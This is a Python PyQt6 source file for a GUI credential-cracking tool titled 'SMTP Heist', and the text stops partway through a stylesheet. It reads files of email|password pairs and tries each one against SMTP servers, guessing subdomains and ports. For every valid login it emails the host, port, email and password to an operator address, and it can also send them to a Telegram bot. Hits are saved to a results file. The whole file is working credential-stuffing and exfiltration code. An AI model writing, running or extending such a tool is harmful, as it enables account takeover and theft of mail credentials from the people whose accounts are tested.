from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QPushButton, QVBoxLayout, QWidget, QTabWidget, QDialog, QStackedLayout, QGridLayout,
    QHBoxLayout, QLabel, QFileDialog, QTextEdit, QFrame, QLineEdit, QCheckBox, QGraphicsDropShadowEffect, QSpacerItem, QSizePolicy,
)
from PyQt6.QtCore import Qt, QPropertyAnimation, QRect, QEasingCurve, QSequentialAnimationGroup, QTimer, QPointF, QThread, pyqtSignal, QRunnable, QObject, QThreadPool
from PyQt6.QtGui import QFont, QPainter, QPen, QColor, QConicalGradient, QPixmap, QIcon
from PyQt6.QtWebEngineWidgets import QWebEngineView
import sys, os
from configparser import ConfigParser

from email.mime.multipart import MIMEMultipart

import requests
#import logging
import smtplib

import smtplib
from email.mime.text import MIMEText
import logging
logging.basicConfig(level=logging.INFO, format='%(message)s')

try:
    os.mkdir('SMTP_Results')
except:
    pass 

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except AttributeError:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)

"""

config['Config'] = {}
config['Config']['SMTP_HOSTS'] = self.smtphost_input.toPlainText()
config['Config']['PORTS'] = self.ports_input.text()
config['Config']['EMAIL_SENDER'] = self.email_input.text()
config['Config']['TIMEOUT'] = self.timeout_input.text()
config['Config']['TELEGRAM_CHATID'] = self.chat_id_input.text()
config['Config']['TELEGRAM_TOKEN'] = self.api_token_input.text()
config['Config']['HEADER'] = self.header_input.text()
config['Config']['HTML_Content'] = self.html_input.toPlainText()

udate_smtp_hosts = config['Config']['SMTP_HOSTS'] 
udate_email_input = config['Config']['EMAIL_SENDER']
udate_smtpport = config['Config']['PORTS']
udate_timeout = config['Config']['TIMEOUT']
udate_chatid = config['Config']['TELEGRAM_CHATID']
udate_apitoken = config['Config']['TELEGRAM_TOKEN'] 
udate_header = config['Config']['HEADER'] 
udate_htmlcontent = config['Config']['HTML_Content']  

class Signals(QObject):
    Percentage_Task = pyqtSignal(int) 
    # Progress_good = pyqtSignal(int)
    # Progress_bad = pyqtSignal(int)
    Progress_tasking = pyqtSignal(int)
    Progress_remaining = pyqtSignal(int)

class Status_Signal(QObject):
    Successed = pyqtSignal()  
    Failed = pyqtSignal()     
"""





class PreviewDialog(QDialog):
    def __init__(self, header, html_content):
        super().__init__()
        self.setWindowTitle("Email Preview")
        self.setWindowIcon(QIcon(resource_path("Images/Logo.png")))
        #FORM SIZE OF EMAIL PREVIEW
        self.setGeometry(100, 100, 800, 600)  
        self.setStyleSheet("background-color: #101010; color: #E0E0E0;")

        # Layout Dialog
        layout = QVBoxLayout()
        self.setLayout(layout)

        # WebView by QWebEngineView
        self.html_view = QWebEngineView()

        # Email-styled HTML content (you can modify as you wish)
        styled_html = f"""
        <html>
            <head>
                <style>
                    body {{
                        font-family: Arial, sans-serif;
                        color: #333;
                        margin: 0;
                        padding: 0;
                        background-color: #1A1A1A;
                    }}
                    .email-container {{
                        max-width: 600px;
                        margin: auto;
                        background-color: #ffffff;
                        border-radius: 10px;
                        padding: 20px;
                        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.25);  /* Alternative shadow */
                    }}
                    .email-header {{
                        font-size: 24px;
                        font-weight: bold;
                        color: #3949AB;
                        margin-bottom: 20px;
                    }}
                    .email-body {{
                        font-size: 16px;
                        color: #555;
                    }}
                </style>
            </head>
            <body>
                <div class="email-container">
                    <div class="email-header">Header Subject : {header}</div>
                    <div class="email-body">{html_content}</div>    
                </div>
            </body>
        </html>

        
        """
        
        self.html_view.setHtml(styled_html)
        layout.addWidget(self.html_view)

class Status_Signal(QObject):
    # Signal for Successed (host, port, email, password)
    Successed = pyqtSignal(str, str, str, str)  
    #Signal for Failed (email, password)
    Failed = pyqtSignal(str, str)  
    



#https://stackoverflow.com/a/62163344


class Worker(QRunnable):
    #self.worker = Worker(smtp_emailer, smtp_passworder,  self.udate_smtp_hosts, self.udate_email, self.udate_smtpport,  self.udate_timeout, self.udate_chatid, self.udate_apitoken, self.udate_header, self.udate_htmlcontent)
    def __init__(self, stmp_user, smtp_passwd, smtp_subdomainlists, config_smtphosts, config_email, config_portlist, config_timeout, options_telegram, config_chatid, config_apitoken, config_header, config_htmlcontent, duplicate_failed):
        super().__init__()

        self.failed_duplicate = duplicate_failed
        self.target_smtpuser = stmp_user
        self.target_smtpasswd = smtp_passwd
        self.signals = Status_Signal()
        #self.file_targeted = path_file
        self.list_smtphosts = config_smtphosts
        self.list_ports = config_portlist
        self.config_email = config_email
        self.timeout_x = str(config_timeout).strip()
        self.tg_options = str(options_telegram).strip()
        self.config_chatid = config_chatid
        self.config_apitoken = config_apitoken
        self.mail_header = config_header
        self.htmlcontent = config_htmlcontent
        self.smtp_subdomains = smtp_subdomainlists

        
        
        #host_list = str(self.list_smtphosts).splitlines()
        #print(host_list)
        #print(self.tg_options)
        #self.TARGET_TOTALED = total_targeted
        #self.signals = signals


        # self.TARGET_FAILED = 1
        # self.TARGET_HITTED = 0
        # self.TARGET_COUNTED = 0
        # self.TARGET_SKIP = 0


        # Some Idea in this Part from Another SMTP Cracker and thank for it 
        # self.hosts=["","smtp.","mail.","webmail.","secure.","plus.smtp.","smtp.mail.","smtp.att.","pop3.","securesmtp.","outgoing.","smtp-mail.","plus.smtp.mail.","Smtpauths.","Smtpauth."]
		# self.ports=[587,465,25]
		# self.timeout=13


        # self.smtp_subdomains = [
        #     "smtp", #"smtpout", "webmail", #"email", "imap", "pop", "pop3", "mailserver",
        #     #"smtp1", "smtp2", "mx", "mx1", "mx2", "mx3", "mail1", "mail2", "relay",
        #     #"mailgate", "smtp-gateway", "emailserver", "smtp-mail", "exchange",
        #     #"securemail", "outbound", "inbound", "smtp-relay", "smtp-secure", "authsmtp"
        # ]
        
        #https://stackoverflow.com/questions/56104009/how-should-i-use-parse-mode-html-in-telegram-python-bot
    def TG_SendRes(self, message):
        return requests.get(f'https://api.telegram.org/bot{self.config_apitoken}/sendMessage', params={
            'chat_id': self.config_chatid,
            'text': message,
            'parse_mode': 'HTML'
        }) 

    #tg_result('host|port|smtp|password')


    def run(self):
        try:
            list_ports = str(self.list_ports).strip()
            host_list = [line.strip() for line in str(self.list_smtphosts).splitlines()]
            #print(host_list)
            for smtp_host in host_list: #lists of host_custom 
                if 'smtp.host.default' == str(smtp_host):
                    #smtp_host = self.FindHoster(self.target_smtpuser) #If Users was work with default smtp      
                    self.Start_Random(list_ports, self.target_smtpuser, self.target_smtpasswd) 
                
                if ',' in list_ports:
                    dic_ports = str(list_ports).split(',')
                else:
                    dic_ports = [list_ports]

                for port in dic_ports:
                    
                    if port.strip() == '587':
                        self.send_email_587(smtp_host, port, self.target_smtpuser, self.target_smtpasswd)
                    elif port.strip() == '465':
                        self.send_email_465(smtp_host, port, self.target_smtpuser, self.target_smtpasswd)
                    elif port.strip() == '25':
                        self.send_email_25(smtp_host, port, self.target_smtpuser, self.target_smtpasswd)
                    else:
                        #logging.error(f"Unknown port: {port}")
                        pass 

        except Exception as e:
            pass 
            #logging.error(f"Error in EmailTask run: {str(e)}")


    #Port 587 uses TLS (Transport Layer Security), and 465 port is SSL SMTP : 

    def send_email_587(self, host, port, email, password):
        try:
            body = f"""
                   <html>
                        <body style="font-family: Arial, sans-serif; background-color: #1F262F; color: #e0e0e0; margin: 0; padding: 20px;">
                            <center>
                            <!-- Content Section -->
                            <div style="background-color: #3B414B; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);">
                                <div style="margin-bottom: 20px;">
                                    <!-- Dynamic HTML content -->
                                    {self.htmlcontent}
                                </div>

                                <hr style="border: 1px solid #444;">

                                <!-- SMTP_LOG Section -->
                                <p style="font-size: 18px; color: #ffffff; font-weight: bold; margin-bottom: 10px;">SMTP_LOG:</p>
                                <p style="font-size: 16px; color: #bbbbbb;"><strong>Host:</strong> <span style="color: #1e90ff;">{host}</span></p>
                                <p style="font-size: 16px; color: #bbbbbb;"><strong>Port:</strong> <span style="color: #1e90ff;">{port}</span></p>
                                <p style="font-size: 16px; color: #bbbbbb;"><strong>Email:</strong> <span style="color: #1e90ff;">{email}</span></p>
                                <p style="font-size: 16px; color: #bbbbbb;"><strong>Password:</strong> <span style="color: #1e90ff;">{password}</span></p></center>
                            </div>

                        </body>
                    </html>
            """

            msg = MIMEMultipart()
            msg['Subject'] = self.mail_header  
            msg['From'] = email                
            msg['To'] = self.config_email    
            msg.attach(MIMEText(body, 'html'))

            with smtplib.SMTP(host, int(port), timeout=int(self.timeout_x)) as server:
                server.ehlo()
                server.starttls()
                server.ehlo()
                server.login(email, password)
                server.sendmail(email, self.config_email, msg.as_string())
                #logging.info(f"Email sent successfully from {email} to {self.config_email} via {host}:{port}")
                if self.tg_options == 'enabled':
                    self.TG_SendRes(f'[ 🚀 ] ---- SMTP_LOG ---- [ ⚡ ]\n\n{host}|{port}|{email}|{password}')
                self.signals.Successed.emit(host, port, email, password)
        except smtplib.SMTPAuthenticationError:
            if not self.failed_duplicate:
                self.failed_duplicate = True
                self.signals.Failed.emit(email, password)
            
        except smtplib.SMTPException as e:
            if not self.failed_duplicate:
                self.failed_duplicate = True
                self.signals.Failed.emit(email, password)

        except Exception as e:
            if not self.failed_duplicate:
                self.failed_duplicate = True
                self.signals.Failed.emit(email, password)
        
    # def FindHoster(self, email):
    #     return str(email).split('@')[-1]

    

    def send_email_465(self, host, port, email, password):
        try:
            body = f"""
                   <html>
                        <body style="font-family: Arial, sans-serif; background-color: #1F262F; color: #e0e0e0; margin: 0; padding: 20px;">
                            <center>
                            <!-- Content Section -->
                            <div style="background-color: #3B414B; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);">
                                <div style="margin-bottom: 20px;">
                                    <!-- Dynamic HTML content -->
                                    {self.htmlcontent}
                                </div>

                                <hr style="border: 1px solid #444;">

                                <!-- SMTP_LOG Section -->
                                <p style="font-size: 18px; color: #ffffff; font-weight: bold; margin-bottom: 10px;">SMTP_LOG:</p>
                                <p style="font-size: 16px; color: #bbbbbb;"><strong>Host:</strong> <span style="color: #1e90ff;">{host}</span></p>
                                <p style="font-size: 16px; color: #bbbbbb;"><strong>Port:</strong> <span style="color: #1e90ff;">{port}</span></p>
                                <p style="font-size: 16px; color: #bbbbbb;"><strong>Email:</strong> <span style="color: #1e90ff;">{email}</span></p>
                                <p style="font-size: 16px; color: #bbbbbb;"><strong>Password:</strong> <span style="color: #1e90ff;">{password}</span></p></center>
                            </div>

                        </body>
                    </html>
            """

            msg = MIMEMultipart()
            msg['Subject'] = self.mail_header  
            msg['From'] = email                
            msg['To'] = self.config_email    
            msg.attach(MIMEText(body, 'html'))


            # Establish SMTP SSL with port 465
            with smtplib.SMTP_SSL(host, int(port), timeout=int(self.timeout_x)) as server:
                server.login(email, password)
                server.sendmail(email, self.config_email, msg.as_string())
                #logging.info(f"Email sent successfully from {email} to {self.config_email} via {host}:{port}")
                if self.tg_options == 'enabled':
                    self.TG_SendRes(f'[ 🚀 ] ---- SMTP_LOG ---- [ ⚡ ]\n\n{host}|{port}|{email}|{password}')
                self.signals.Successed.emit(host, port, email, password)
        
        except smtplib.SMTPAuthenticationError:
            if not self.failed_duplicate:
                self.failed_duplicate = True
                self.signals.Failed.emit(email, password)
        except smtplib.SMTPException as e:
            if not self.failed_duplicate:
                self.failed_duplicate = True
                self.signals.Failed.emit(email, password)
        except Exception as e:
            if not self.failed_duplicate:
                self.failed_duplicate = True
                self.signals.Failed.emit(email, password)


    def send_email_25(self, host, port, email, password):
        try:
            body = f"""
                   <html>
                        <body style="font-family: Arial, sans-serif; background-color: #1F262F; color: #e0e0e0; margin: 0; padding: 20px;">
                            <center>
                            <!-- Content Section -->
                            <div style="background-color: #3B414B; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);">
                                <div style="margin-bottom: 20px;">
                                    <!-- Dynamic HTML content -->
                                    {self.htmlcontent}
                                </div>

                                <hr style="border: 1px solid #444;">

                                <!-- SMTP_LOG Section -->
                                <p style="font-size: 18px; color: #ffffff; font-weight: bold; margin-bottom: 10px;">SMTP_LOG:</p>
                                <p style="font-size: 16px; color: #bbbbbb;"><strong>Host:</strong> <span style="color: #1e90ff;">{host}</span></p>
                                <p style="font-size: 16px; color: #bbbbbb;"><strong>Port:</strong> <span style="color: #1e90ff;">{port}</span></p>
                                <p style="font-size: 16px; color: #bbbbbb;"><strong>Email:</strong> <span style="color: #1e90ff;">{email}</span></p>
                                <p style="font-size: 16px; color: #bbbbbb;"><strong>Password:</strong> <span style="color: #1e90ff;">{password}</span></p></center>
                            </div>

                        </body>
                    </html>
            """

            msg = MIMEText(body)
            msg['Subject'] = self.mail_header
            msg['From'] = email
            msg['To'] = self.config_email
            msg.attach(MIMEText(body, 'html'))

            # Establish SMTP connection with port 25
            with smtplib.SMTP(host, int(port), timeout=int(self.timeout_x)) as server:  
                # Identify server with ehlo
                server.ehlo()  
                server.login(email, password)
                server.sendmail(email, self.config_email, msg.as_string())
                #logging.info(f"Email sent successfully from {email} to {self.config_email} via {host}:{port}")
                if self.tg_options == 'enabled':
                    self.TG_SendRes(f'[ 🚀 ] ---- SMTP_LOG ---- [ ⚡ ]\n\n{host}|{port}|{email}|{password}')
                self.signals.Successed.emit(host, port, email, password)

        except smtplib.SMTPAuthenticationError:
            if not self.failed_duplicate:
                self.failed_duplicate = True
                self.signals.Failed.emit(email, password)
        except smtplib.SMTPException as e:
            if not self.failed_duplicate:
                self.failed_duplicate = True
                self.signals.Failed.emit(email, password)
        except Exception as e:
            if not self.failed_duplicate:
                self.failed_duplicate = True
                self.signals.Failed.emit(email, password)


    
    def Start_Random(self, port_lists, email, password):
        domain = str(email).split("@")[-1]

        if ',' in self.smtp_subdomains:
            subdomain_lists = str(self.smtp_subdomains).split(',')
        else:
            subdomain_lists = [self.smtp_subdomains]

        #print(subdomain_lists) ['smtp', ' smtpout', ' try', ' test']

        if ',' in port_lists:
            dic_portlist = str(port_lists).split(',')
        else:
            dic_portlist = [port_lists]

        for subdomain in subdomain_lists:
            for port in dic_portlist:
                
                smtp_host = f"{subdomain}.{domain}"
                #print(smtp_host)
                try:
                    # SMTP_SSL for port 465 also with otherwise
                    if port == 465:
                        server = smtplib.SMTP_SSL(smtp_host, port, timeout=int(self.timeout_x))
                    else:
                        server = smtplib.SMTP(smtp_host, port, timeout=int(self.timeout_x))
                        if port == 587:
                            # Upgrade to TLS for port 587
                            server.starttls()

                    server.login(email, password)  
             
                    
                    body = f"""
                    <html>
                        <body style="font-family: Arial, sans-serif; background-color: #1F262F; color: #e0e0e0; margin: 0; padding: 20px;">
                            <center>
                            <!-- Content Section -->
                            <div style="background-color: #3B414B; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);">
                                <div style="margin-bottom: 20px;">
                                    <!-- Dynamic HTML content -->
                                    {self.htmlcontent}
                                </div>

                                <hr style="border: 1px solid #444;">

                                <!-- SMTP_LOG Section -->
                                <p style="font-size: 18px; color: #ffffff; font-weight: bold; margin-bottom: 10px;">SMTP_LOG:</p>
                                <p style="font-size: 16px; color: #bbbbbb;"><strong>Host:</strong> <span style="color: #1e90ff;">{smtp_host}</span></p>
                                <p style="font-size: 16px; color: #bbbbbb;"><strong>Port:</strong> <span style="color: #1e90ff;">{port}</span></p>
                                <p style="font-size: 16px; color: #bbbbbb;"><strong>Email:</strong> <span style="color: #1e90ff;">{email}</span></p>
                                <p style="font-size: 16px; color: #bbbbbb;"><strong>Password:</strong> <span style="color: #1e90ff;">{password}</span></p></center>
                            </div>

                        </body>
                    </html>


                    """
                    
                   
                    msg = MIMEMultipart()
                    msg['Subject'] = self.mail_header  
                    msg['From'] = email                
                    msg['To'] = self.config_email     

    
                    msg.attach(MIMEText(body, 'html'))

                    server.sendmail(email, self.config_email, msg.as_string())
                    if self.tg_options == 'enabled':
                        self.TG_SendRes(f'[ 🚀 ] ---- SMTP_LOG ---- [ ⚡ ]\n\n{smtp_host}|{port}|{email}|{password}')
                    server.quit()  
                    self.signals.Successed.emit(smtp_host, port, email, password)
                except smtplib.SMTPAuthenticationError:
                    if not self.failed_duplicate:
                        self.failed_duplicate = True
                        self.signals.Failed.emit(email, password)
                except Exception as e:
                    if not self.failed_duplicate:
                        self.failed_duplicate = True
                        self.signals.Failed.emit(email, password)
                

class SMTPGui(QMainWindow):
    progress_value_changed = pyqtSignal(int) 
    

    #Reverse Crash need fix tomorrow
   
    def __init__(self):
        super().__init__()
        
        self.status_notification = {"status": "disabled"}
        self.thread_pool = QThreadPool.globalInstance()
        self.thread_pool.setMaxThreadCount(20)
        self.total_success = 0
        self.total_fail = 0

        self.Force_STOP = False
    
        self.TARGET_COUNTED = 0
        self.Calculating_Percentage = 0
        self.TARGET_TOTAL = 0
        self.TARGET_REMAINING = 0
        self.TARGET_FAILED = 0
        self.TARGET_HITTED = 0 
        self.TARGET_SKIP = 0 
        self.signals = Status_Signal()
        self.good_value = 0
        self.bad_value = 0
        self.tasking_value = 0
        self.remaining_value = 0
        self.file_path = ""
        self.progress_value = 0
        self.progress_timer = QTimer()
        self.progress_value_changed.connect(self.update_progress)
        self.progress_timer.setInterval(50)

        #config WinForm
        self.setWindowTitle("SMTP Heist | DRCrypter.ru")  
        self.setWindowIcon(QIcon(resource_path("Images/Logo.png")))
        self.setGeometry(50, 50, 1200, 800)
        self.setStyleSheet("background-color: #101010; color: #E0E0E0;")
        self.setFixedSize(1200, 800)

        self.central_widget = QTabWidget()
        self.central_widget.setTabPosition(QTabWidget.TabPosition.North)
        # self.central_widget.setStyleSheet(
        #     "QTabWidget::tab-bar { alignment: center; }"
        #     "QTabBar::tab { background: qlineargradient(spread:pad, x1:0, y1:0, x2:1, y2:1, stop:0 #3949AB, stop:1 #29B6F6); padding: 12px; margin: 0px; color: #FFFFFF; font-weight: bold; font-size: 18px; border-radius: 15px; }"
        #     "QTabBar::tab:selected { background: qlineargradient(spread:pad, x1:0, y1:0, x2:1, y2:1, stop:0 #29B6F6, stop:1 #1E88E5); color: #FFFFFF; font-size: 18px; }"
        # )
        self.central_widget.setStyleSheet("""
            QTabWidget::pane {
                border-top: 2px solid #3949AB;
                background: #101010;
                margin: 0px;
            }
            QTabWidget::tab-bar {
                alignment: center;
            }
            QTabBar::tab {
                background: #3949AB;
                color: #FFFFFF;
                padding: 12px 20px;
                font-weight: bold;
                font-size: 18px;
                border: 2px solid #3949AB;
                border-bottom: none;
            }
            QTabBar::tab:first {
                border-top-left-radius: 15px;
                border-bottom-left-radius: 15px;
            }
            QTabBar::tab:last {
                border-top-right-radius: 15px;
                border-bottom-right-radius: 15px;
            }
            QTabBar::tab:selected {
                background: #29B6F6;
                color: #FFFFFF;
                font-size: 18px;
            }
            QTabBar::tab:!selected {
                margin-top: 2px;
            }
        """)


        self.setCentralWidget(self.central_widget)
        self.central_widget.currentChanged.connect(self.animate_tab_change)

        # Setup Tabs
        self.main_tab = QWidget()
        self.second_tab = QWidget()
        self.central_widget.addTab(self.main_tab, "Dashboard")
        self.central_widget.addTab(self.second_tab, "Settings / Config")

        self.setup_main_tab()
        self.setup_second_tab()
        if os.path.exists('Config.ini'):
            self.Load_Config()    

        QTimer.singleShot(10, self.initial_slide_animation)
        




     #set value as config saved
    def Load_Config(self):
        try:
            config = ConfigParser()
            config.read('Config.ini')
            #if 'EMAIL_SENDER' in config:
            self.udate_subdomain_smtp  = config['Config']['SMTP_SUBDOMAIN']
            self.udate_smtp_hosts = config['Config']['SMTP_HOSTS'] 
            self.udate_email = config['Config']['EMAIL_SENDER']
            self.udate_smtpport = config['Config']['PORTS']
            self.udate_timeout = config['Config']['TIMEOUT']
            self.enable_telegram = config['Config']['NOTIFICATION']
            self.udate_chatid = config['Config']['TELEGRAM_CHATID']
            self.udate_apitoken = config['Config']['TELEGRAM_TOKEN'] 
            self.udate_header = config['Config']['HEADER'] 
            self.udate_htmlcontent = config['Config']['HTML_Content']  
            self.smtphost_input.setText(self.udate_smtp_hosts)
            self.ports_input.setText(self.udate_smtpport)
            self.email_input.setText(self.udate_email)
            self.timeout_input.setText(self.udate_timeout)
            self.chat_id_input.setText(self.udate_chatid)
            self.api_token_input.setText(self.udate_apitoken)
            self.header_input.setText(self.udate_header)
            self.html_input.setPlainText(self.udate_htmlcontent)
         
        except:
            pass 

    #self, lists_target, config_smtphosts, config_email, config_portlist, config_timeout, config_chatid, config_apitoken, config_header, config_htmlcontent
    # def Orderby(self, smtp_email, smtp_password):
    #     self.TARGET_COUNTED += 1
    #     # Process the parts (email, password, etc.)
        
    #     self.signals_status = Status_Signal()
    #     # Create the worker for this task
    #     self.worker = Worker(
    #         smtp_email, smtp_password,
    #         self.udate_smtp_hosts, self.udate_email, self.udate_smtpport,
    #         self.udate_timeout, self.udate_chatid, self.udate_apitoken,
    #         self.udate_header, self.udate_htmlcontent, self.signals_status
    #     )

    #     # Connect worker signals to main thread slots using lambda
    #     self.signals_status.Successed.connect(
    #         lambda email=smtp_email, password=smtp_password: self.CheckSucess(email, password)
    #     )
    #     self.signals_status.Failed.connect(
    #         lambda email=smtp_email, password=smtp_password: self.CheckFailed(email, password)
    #     )

    def Live_Update(self):
        self.TARGET_REMAINING = self.TARGET_TOTAL - self.TARGET_COUNTED
        self.update_progress(self.TARGET_COUNTED, self.TARGET_TOTAL)

    def CheckSucess(self, host_smtp, port_stmp, smtp_email, smtp_password):
        self.TARGET_COUNTED += 1
        self.TARGET_HITTED += 1

        Success_Stored = r"SMTP_Results\Success_SMTP.txt"
        self.log_console.append(f"[+] Success Logged : {host_smtp} - {port_stmp} - {smtp_email} - {smtp_password}")
        with open(Success_Stored, "a", encoding="utf-8") as file:
            file.write(f"{host_smtp}|{port_stmp}|{smtp_email}|{smtp_password}\n")
        self.Live_Update()
        self.update_good_bad_display()
        self.update_tasking_remaining_display()

    def CheckFailed(self, smtp_email, smtp_password):
        self.TARGET_COUNTED += 1
        self.TARGET_FAILED += 1
        Failed_Stored = r"SMTP_Results\Failed_SMTP.txt"
        self.log_console.append(f"[x] Failed Logged : {smtp_email} - {smtp_password}")
        with open(Failed_Stored, "a", encoding="utf-8") as file:
            file.write(f"{smtp_email}|{smtp_password}\n")
        self.Live_Update()
        self.update_good_bad_display()
        self.update_tasking_remaining_display()
        
    def update_good_bad_display(self):
        current_text = f"{self.TARGET_HITTED}/{self.TARGET_FAILED}"
        self.card1_info.setText(f"{current_text}")

    def update_tasking_remaining_display(self):
        current_text = f"{self.TARGET_COUNTED}/{self.TARGET_REMAINING}"
        self.card2_info.setText(f"{current_text}")
        
    def update_progress(self, Total_lived, Total_all):
        try:
            self.Calculating_Percentage = int((Total_lived / Total_all) * 100)
        except ZeroDivisionError:
            #Prevent error 
            self.Calculating_Percentage = 0 

        #print(f"Progress: {self.Calculating_Percentage}%") debug
        self.canvas.set_progress(self.Calculating_Percentage)  
       

    def on_timer_timeout(self):
        self.progress_value_changed.emit(self.progress_value)  # Emit signal with updated value


    def START_TASK(self):
        self.log_console.append("START Task")
        
        try:
            with open(self.file_path, encoding="utf-8", errors="ignore") as file:
                self.TARGET_TOTAL = sum(1 for _ in file)
            #print(f"Total target count: {self.TARGET_TOTAL}")
            
            if self.TARGET_TOTAL == 0:
                return #prevent empty or no task for work == waste time
            
            with open(self.file_path, "r", encoding="utf-8", errors="ignore") as file:
                for line in file:
                    line = line.strip()

                    if line and '|' in line:
                        parts = line.split('|')
                        if len(parts) == 4:
                            
                            self.TARGET_TASKER(parts[2], parts[3])
                            #self.Live_Update()
                        elif len(parts) == 2:
                            self.TARGET_TASKER(parts[0], parts[1])
                        else:
                            #logging.warning(f"Skip line: {line}")
                            self.TARGET_COUNTED += 1
                            self.TARGET_FAILED += 1
                            self.Live_Update()
                            self.update_good_bad_display()
                            self.update_tasking_remaining_display()
                    else:
                        #logging.warning(f"Skip empty or wrong line: {line}")
                        self.TARGET_COUNTED += 1
                        self.TARGET_FAILED += 1
                        self.Live_Update()
                        self.update_good_bad_display()
                        self.update_tasking_remaining_display()
                    
            #except Exception as e:
            #   logging.error(f"Error in Worker run: {str(e)}")

            

        except Exception as e:
            #logging.error(f"Error in run method: {str(e)}")
            self.log_console.append(f"Error: {str(e)}")
            if 'SMTPGui' in str(e) and  'object has no attribute' in str(e) and 'udate_subdomain_smtp' in str(e):
                self.log_console.append(f"You was Missing Config.ini - Please Config in TabPage2 and click Save")
        

    def TARGET_TASKER(self, smtp_emailer, smtp_passworder):
            
        #  Worker without the 'signals' argument
        worker = Worker(smtp_emailer, smtp_passworder, self.udate_subdomain_smtp,
                            self.udate_smtp_hosts, self.udate_email, self.udate_smtpport,
                            self.udate_timeout, self.enable_telegram, self.udate_chatid, self.udate_apitoken,
                            self.udate_header, self.udate_htmlcontent, False)

        # Connect signals after worker initialization
        worker.signals.Successed.connect(self.CheckSucess)
        worker.signals.Failed.connect(self.CheckFailed)
        
        # Start the worker using QThreadPool
        self.thread_pool.start(worker)
            

        # self.worker = Worker(self.file_path, self.udate_smtp_hosts, self.udate_email, self.udate_smtpport, self.udate_timeout, self.udate_chatid, self.udate_apitoken, self.udate_header, self.udate_htmlcontent)
        # self.worker.signals.Percentage_Task.connect(self.update_progress)
        # self.worker.signals.Progress_good.connect(self.handle_good_progress)
        # self.worker.signals.Progress_bad.connect(self.handle_bad_progress)
        # self.worker.signals.Progress_tasking.connect(self.handle_tasking_progress)
        # self.worker.signals.Progress_remaining.connect(self.handle_remaining_progress)
 

    def stop_progress(self):
        #wait 
        #print("User wanted STOP Program")
        self.log_console.append("STOP Program & Exit")
        self.thread_pool.clear()
        QApplication.quit()
        self.progress_timer.stop()  #
        self.progress_value = 0  
        self.canvas.set_progress(self.progress_value)


    def setup_main_tab(self):
        main_layout = QVBoxLayout()
        main_layout.setSpacing(20)
        main_layout.setContentsMargins(10, 10, 10, 10)
        self.main_tab.setLayout(main_layout)

        card_layout = QHBoxLayout()
        card1, self.card1_info = self.create_card("Good/Failed", resource_path("Images/goodbad.png"), "")
        card2, self.card2_info = self.create_card("Task/Remaining", resource_path("Images/tasking.png"), "")
        card3 = self.create_progress_card(width=380, height=250)

        card_layout.addWidget(card1)
        card_layout.addWidget(card2)
        card_layout.addWidget(card3)
        main_layout.addLayout(card_layout)

        main_layout.addSpacerItem(QSpacerItem(0, 30, QSizePolicy.Policy.Minimum, QSizePolicy.Policy.Fixed))

        # Row 2: Load Button, Display Path, and SMTP Host Input
        row2_layout = QHBoxLayout()

        # Button Select a File Target
        self.load_file_button = self.create_button("Load *.txt", width=180, height=50, color1="#3949AB", color2="#29B6F6", color_hover1="#5C6BC0", color_hover2="#3F51B5")
        self.load_file_button.clicked.connect(self.TARGET_FILE)
        row2_layout.addWidget(self.load_file_button)

        # Display for selected file path
        self.file_path_display = QLabel("")
        self.file_path_display.setFixedSize(800, 50)
        self.file_path_display.setStyleSheet("background-color: #1C1C2E; padding: 15px; border-radius: 10px; font-size: 18px")
        row2_layout.addWidget(self.file_path_display)

        # self.smtphost_input = QTextEdit()
        # self.smtphost_input.setPlaceholderText("Enter SMTP hosts, one per line.")
        # self.smtphost_input.setStyleSheet(
        #     "QTextEdit { color: #E0E0E0; font-size: 15px; border: 2px solid #3949AB; background-color: #1A1A1A; border-radius: 10px; padding: 10px; }"
        #     "QTextEdit:focus { border: 2px solid #29B6F6; }"
        # )
        # self.smtphost_input.setFixedWidth(300)
        # self.smtphost_input.setFixedHeight(150)  # Increased height for more lines of input
        # self.smtphost_input.setFont(QFont("Arial", 14))
        # row2_layout.addWidget(self.smtphost_input)

        # Add Row2 Layer to main layout
        main_layout.addLayout(row2_layout)

        main_layout.addSpacerItem(QSpacerItem(0, 20, QSizePolicy.Policy.Minimum, QSizePolicy.Policy.Fixed))

        # Add Row3 with SMTP Ports Label, Ports Input, Start, and Stop Buttons
        row3_layout = QHBoxLayout()


      
        # Start Button UI
        self.start_button = self.create_button("START Task", width=180, height=50, color1="#00C853", color2="#00E676", color_hover1="#66BB6A", color_hover2="#43A047")
        self.start_button.clicked.connect(self.START_TASK)
        row3_layout.addWidget(self.start_button)

        # Stop Button UI
        self.stop_button = self.create_button("STOP Task", width=180, height=50, color1="#D32F2F", color2="#FF5252", color_hover1="#EF5350", color_hover2="#E53935")
        self.stop_button.clicked.connect(self.stop_progress)
        row3_layout.addWidget(self.stop_button)

        # Add Row3 to main layout
        main_layout.addLayout(row3_layout)
        main_layout.addSpacerItem(QSpacerItem(0, 20, QSizePolicy.Policy.Minimum, QSizePolicy.Policy.Fixed))

        # Add Row4 Console log display  with full width
        self.log_console = self.create_text_display(width=1180, height=245)
        self.log_console.setPlaceholderText("Reported Log")

        #         # )
        # self.central_widget.setStyleSheet("""
        #     QTabWidget::pane {
        #         border-top: 2px solid #3949AB;
        #         background: #101010;
        #         margin: 0px;
        #     }
        #     QTabWidget::tab-bar {
        #         alignment: center;
        #     }
        #     QTabBar::tab {
        #         background: #3949AB;
        #         color: #FFFFFF;
        #         padding: 12px 20px;
        #         font-weight: bold;
        #         font-size: 18px;
        #         border: 2px solid #3949AB;
        #         border-bottom: none;
        #     }
        #     QTabBar::tab:first {
        #         border-top-left-radius: 15px;
        #         border-bottom-left-radius: 15px;
        #     }
        #     QTabBar::tab:last {
        #         border-top-right-radius: 15px;
        #         border-bottom-right-radius: 15px;
        #     }
        #     QTabBar::tab:selected {
        #         background: #29B6F6;
        #         color: #FFFFFF;
        #         font-size: 18px;
        #     }
        #     QTabBar::tab:!selected {
        #         margin-top: 2px;
        #     }
        # """)
        self.central_widget.setStyleSheet("""
        /* QTabWidget Styling */
QTabWidget::pane {
    border-top: 2px solid #3949AB;
    background: #101010;
}

QTabWidget::tab-bar {
    alignment: center;
}

